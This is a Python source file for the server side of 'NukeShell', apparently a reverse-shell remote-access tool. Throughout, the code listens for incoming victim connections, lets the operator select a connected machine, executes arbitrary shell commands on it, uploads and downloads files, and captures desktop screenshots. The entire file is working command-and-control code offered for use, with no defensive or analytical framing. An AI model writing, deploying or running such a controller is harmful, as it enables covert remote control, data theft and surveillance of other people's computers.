#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/NukeShell

# Import modules
from sys import exit
from os import path
from time import sleep
from colorama import Fore
from threading import Thread
from Core.cli import Clear, ParseArgs, Banner
from Core.clients import Client, ConnectedClients
from socket import socket, \
    AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR

# Parse arguments
print(Banner)
args = ParseArgs()

# Server settings
SERVER_HOST = args.host
SERVER_PORT = args.port

# Create socket
server = socket(
    AF_INET,
    SOCK_STREAM
)
# Settings
server.settimeout(50)
server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
# Bind socket
server.bind((SERVER_HOST, SERVER_PORT))
server.listen(5)
print(f"{Fore.GREEN}[Server]{Fore.WHITE} Listening at {SERVER_HOST}:{SERVER_PORT} ...{Fore.RESET}")


# Stop server
def StopServer():
    clients = len(ConnectedClients)
    print(f"\n{Fore.RED}[Server]{Fore.WHITE} Disconnecting {clients} clients ...")
    # Disconnect all clients
    for client in ConnectedClients:
        Thread(target=client.Disconnect).start()
    # Wait for all clients disconnection
    #while len(ConnectedClients) != 0:
    #    print(len(ConnectedClients))
    #    sleep(0.2)
    sleep(clients / 2)
    # Stop tcp server
    print(f"{Fore.RED}[Server]{Fore.WHITE} Stopping server ...")
    server.shutdown(SHUT_RDWR)
    server.close()
    exit(1)

# Accept all connections
def AcceptClients():
    while True:
        # Client connected
        try:
            Client(*server.accept())
        except OSError:
            return
Thread(target=AcceptClients).start()

# Clients manager
while True:
    # Lock while no clients connected
    print(f"{Fore.GREEN}[Server]{Fore.WHITE} Waiting for connections ...{Fore.RESET}")
    while len(ConnectedClients) <= 0:
        try:
            sleep(0.2)
        except KeyboardInterrupt:
            StopServer()
    # Print all connected clients
    for i, client in enumerate(ConnectedClients):
        print("{}[Client {}] {}{}:{}{}".format(Fore.LIGHTYELLOW_EX, i+1, Fore.WHITE, *client.address, Fore.RESET))

    # Get client from list
    try:
        data = input(f"\n{Fore.GREEN}[Server]{Fore.WHITE} Please select client from list: {Fore.RESET}")
        # Cls
        if not data or data.lower() in ["cls", "clear"]:
            # Clear terminal window
            Clear()
            continue
        # Exit
        elif data.lower() in ["q", "exit", "quit", "stop"]:
            raise KeyboardInterrupt
        # Parse client from list
        client = ConnectedClients[int(data) - 1]
    except ValueError:
        Clear()
        print(f"{Fore.RED}[Server]{Fore.WHITE} Please enter digit{Fore.RESET}")
        continue
    except IndexError:
        Clear()
        print(f"{Fore.RED}[Server]{Fore.WHITE} Please select from 1 to",
              len(ConnectedClients), Fore.RESET)
        continue
    except KeyboardInterrupt:
        # Disconnect all clients from server
        StopServer()
    except Exception as error:
        print(f"{Fore.RED}[Server]{Fore.WHITE} An error occurred\n", error)
        continue

    # Clear terminal window
    Clear()

    # Show client welcome message
    welcome = client.Shell("get_welcome_string")
    print(welcome + "\n")

    # Execute commands
    while True:
        # Get input
        prefix = client.Shell("get_commandline_string")
        command = input(prefix)
        response = ""
        # Check if command exists
        if len(command) == 0:
            continue
        # Upload file from server to client
        elif command.startswith("upload"):
            file = command.replace("upload ", "")
            if path.exists(file):
                client.Send("begin_file_upload")
            response = client.SendFile(file)
            client.Read()  # Clean
        # Download file from client to server
        elif command.startswith("download"):
            file = command.replace("download ", "")
            client.Send(f"begin_file_download*{file}")
            response = client.ReceiveFile()
            client.Read()  # Clean
        # Get desktop screenshot
        elif command.startswith("screenshot"):
            client.Send("create_screenshot")
            response = client.ReceiveFile()
            client.Read()  # Clean
        # Exit from shell
        elif command.startswith("exit"):
            # Clear terminal window
            Clear()
            print(f"{Fore.GREEN}[Server] {Fore.WHITE}Exiting from active shell ...{Fore.RESET}")
            break
        # Disconnect client
        elif command.startswith("disconnect"):
            # Clear terminal window
            Clear()
            client.Disconnect()
            break
        # Execute shell command
        else:
            response = client.Shell(command)
        # Show output
        print(f"{Fore.WHITE}{response}{Fore.RESET}")

